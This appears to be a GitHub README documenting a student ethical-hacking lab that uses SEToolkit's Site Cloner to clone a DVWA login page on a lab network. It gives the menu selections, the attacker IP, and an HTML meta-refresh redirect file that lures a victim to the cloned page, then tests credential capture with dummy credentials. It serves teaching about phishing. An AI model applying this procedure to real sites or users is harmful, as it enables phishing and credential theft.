# SEToolkit

This repo contains documentation for two ethical hacking labs performed in a **controlled and authorized lab environment** for educational purposes.

## Labs Included
1. Website Cloning using SEToolkit

This lab documents:
- Step-by-step procedure
- Commands used
- Screenshots
- Observations and findings

⚠️ Disclaimer:  
All activities were conducted in a lab environment with permission. These techniques must not be used on real systems without authorization.

# Website-Cloning-SET/

# Website Cloning Lab using SEToolkit

## Objective
To understand how website cloning and credential harvesting work, and why users must be cautious of phishing and fake login pages.

## Tools Used
- Kali Linux
- SEToolkit

## Lab Setup
- Attacker Machine: Kali Linux
- Target Website: DVWA (Lab VM)
- Attacker IP Address: 10.6.6.1

---

## Step 1: Start SEToolkit

```bash
sudo su
setoolkit
```

This launches the Social-Engineer Toolkit.

## Step 2: Select Attack Type

Inside SEToolkit, the following options were selected:

```bash
1  → Social-Engineering Attacks
2  → Website Attack Vectors
3  → Credential Harvester Attack Method
2  → Site Cloner
```

## Step 3: Configure the Cloning Attack

When prompted, enter the attacker IP address:

```bash
10.6.6.1
```

Then enter the website to be cloned:

```bash
http://dvwa.vm
```

SEToolkit clones the website and hosts it on the attacker machine.

## Step 4: Create Redirect HTML File

A simple HTML file was created to automatically redirect users to the cloned website.
```bash
File Content:
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>
```
**Steps:**

1. Open a text editor

2. Paste the code above

3. Save the file as ladies.html on the Desktop

4. Double-click the file to open it in a browser

## Step 5: Test Credential Capture

Dummy credentials were entered for testing:
```bash
Email: trial@gmail.com
Password: Passwor@01
```
**_These credentials were only for demonstration purposes. You can use you different credentials._**

## Step 6: Stop the Attack and Exit

Return to the terminal and stop SEToolkit:
```bash
Ctrl + C
```
